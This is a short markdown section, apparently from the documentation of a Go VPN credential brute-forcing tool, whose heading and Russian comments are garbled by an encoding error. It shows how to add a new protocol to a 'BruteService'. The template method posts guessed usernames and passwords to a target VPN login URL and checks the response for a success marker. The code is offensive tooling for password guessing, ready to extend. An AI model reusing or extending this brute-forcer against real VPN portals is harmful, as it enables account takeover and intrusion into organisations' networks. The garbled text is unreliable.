## üõ†Ô∏è –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –Ω–æ–≤–æ–≥–æ –ø—Ä–æ—Ç–æ–∫–æ–ª–∞

```go
// 1. –î–æ–±–∞–≤–∏—Ç—å case –≤ bruteOne()
case "NewProtocol":
    success, err = b.bruteNewProtocol(client, vpn, cred.Login, cred.Password)

// 2. –†–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å –º–µ—Ç–æ–¥
func (b *BruteService) bruteNewProtocol(client *fasthttp.Client, vpn *VPN, username, password string) (bool, error) {
    loginURL := vpn.TargetURL + "/login/path"
    
    // –§–æ—Ä–º–∏—Ä—É–µ–º POST –∑–∞–ø—Ä–æ—Å
    formData := url.Values{}
    formData.Set("username", username)
    formData.Set("password", password)
    
    req := fasthttp.AcquireRequest()
    resp := fasthttp.AcquireResponse()
    defer fasthttp.ReleaseRequest(req)
    defer fasthttp.ReleaseResponse(resp)
    
    req.SetRequestURI(loginURL)
    req.Header.SetMethod("POST")
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
    req.SetBodyString(formData.Encode())
    
    err := client.DoTimeout(req, resp, 15*time.Second)
    if err != nil {
        return false, fmt.Errorf("request failed: %w", err)
    }
    
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º —É—Å–ø–µ—Ö –ø–æ –æ—Ç–≤–µ—Ç—É
    body := string(resp.Body())
    if strings.Contains(body, "success_indicator") {
        return true, nil
    }
    
    return false, nil
}
```
